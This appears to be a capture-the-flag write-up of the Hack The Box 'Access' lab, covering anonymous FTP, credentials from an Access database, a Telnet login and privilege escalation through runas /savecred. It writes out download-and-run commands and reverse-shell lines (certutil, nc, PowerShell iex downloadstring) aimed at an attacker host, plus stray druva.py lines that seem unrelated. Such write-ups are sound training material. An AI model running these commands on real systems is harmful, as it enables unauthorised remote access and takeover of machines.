#windows 
# Story
1. Nmap port scan
2. Ftp allows anonymous access
3. Get files from ftp
4. Check http
5. Check backup.mdb
6. There are some credentials for zip file
7. Unzip the zip file with the password from mdb file
8. Check the email
9. Log in to telnet (user flag)
10. Enumerate the machine
11. Public Desktop has some interesting lnk file
12. We can use runas without password
13. Perform reverse shell as root (root flag)

# Enumeration
## Nmap

```
nmap -sC -sV -Pn access.htb            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 09:10 EST
Nmap scan report for access.htb (10.129.88.24)
Host is up (0.12s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd (no more connections allowed)
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.12 seconds
```

## Feroxbuster
nothing so interesting

## FTP Port 21

anonymous login is allowed

```
ftp access.htb                                                                                 
Connected to access.htb.
220 Microsoft FTP Service
Name (access.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
```

```
Engineer Access Control.zip
Backups backup.mdb
```

## Check the files
### Access Control zip
unzip did not work
```
unzip -l accessconstol.zip  
unzip:  cannot find or open accessconstol.zip, accessconstol.zip.zip or accessconstol.zip.ZIP.
```

Instead we tried 7z
```
7z x accesscontrol.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs 11th Gen Intel(R) Core(TM) i7-11700 @ 2.50GHz (A0671),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: accesscontrol.zip
--
Path = accesscontrol.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
ERROR: Wrong password : Access Control.pst
```

### backup.mdb
Dont forget to change the mode from ascii to binary. otherwise we cannot download the entire file.
```
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
  4% |*                          |   245 KiB  245.35 KiB/s    00:21 ETAftp: Reading from network: Interrupted system call
  0% |                           |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 87 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
```

```
ftp> binary
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***************************|  5520 KiB  453.57 KiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:12 (453.48 KiB/s)
```

`apt install mdbtools`

#### mdb-tables
```
mdb-tables backup.mdb 
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx 
```

### auth_user
```
mdb-export backup.mdb auth_user      
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```


### Access Control zip again
Now we have the password, so we should be able to unzip the file.
we can unzip it with the password `access4u@security`

```
 file 'Access Control.pst' 
Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
```

#### pst file
`apt install pst-utils`
```
readpst 'Access Control.pst'
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

### Access Control.mbox

`cat 'Access Control.mbox'`

from John to security
```
Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John
```

## Http Port 80
![[Pasted image 20230223130812.png]]


# Foothold

## Get the shell through Telnet
telnet is open, so we can try it with the credentials we have.
security:4Cc3ssC0ntr0ller
```
telnet access.htb   
Trying 10.129.88.24...
Connected to access.htb.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

## Flag
the flag is under Desktop

# Privilege Escalation
## Enumeration

### Users/Public/Desktop

```
C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public\Desktop

08/22/2018  09:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)   3,309,441,024 bytes free
```

```
type "ZKAccess3.5 Security System.lnk"
C:\Users\Public\Desktoptype "ZKAccess3.5 Security System.lnk
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
                                   runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
               �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
                                                   O�j)�H���
                                                            )ΰ[�_���8{E�3
 O�j)�H���
          )ΰ[�  ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
                                   runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
               �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
                                                   O�j)�H���
                                                            )ΰ[�_���8{E�3
 O�j)�H���
          )ΰ[�  ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
```

```
C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred 
```
runas and /savecred??

### cmdkey
```
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

Seems like admin cred is cached.

### net user
```
C:\Users\Public\Desktop>net user administrator
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/21/2018 9:01:12 PM
Password expires             Never
Password changeable          8/21/2018 9:01:12 PM
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/22/2023 2:09:24 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.
```
Password is not required, so this means that we can use runas without password.

## Reverse shell for root
### Unsuccessful attempt
### upload nc to the compromised machine
In User security
```
certutil -urlcache -split -f http://10.10.14.17:8080/nc.exe nc.exe
```

```
runas /savecred /user:ACCESS\Administrator "ping -n 4 10.10.14.17"
```
`sudo tcpdump -i tun0 icmp`
ping works so runas is working, it just does not return anything

The command below should work but it did not work. I am not sure why since ping is working.
```
runas /savecred /user:ACCESS\Administrator "nc.exe -c cmd.exe 10.10.14.17 1234"
```


### Successful one
We can create the shell using Invoke-PowerShellTcp.ps1.
https://github.com/samratashok/nishang

At the end of the line, we need to add
`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 1234`

From security machine
```
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.17:8080/shell.ps1')"
```

In Kali
Open python server in the same directory as the shell.ps1.
Open another shell for nc listener.


## Root flag
```
nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.88.24] 49174
whoWindows PowerShell running as user Administrator on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>    
```

```
PS C:\Users\Administrator\Desktop> type root.txt
```

```
C:\python27\druva.py "C:\windows\system32\cmd.exe /C copy C:/Users/Administrator/Desktop/flag.txt C:/Users/public"
```

```
C:\python27\druva.py "windows\system32\cmd.exe /C dir C:/Users > C:/Users/Public/test.txt"
```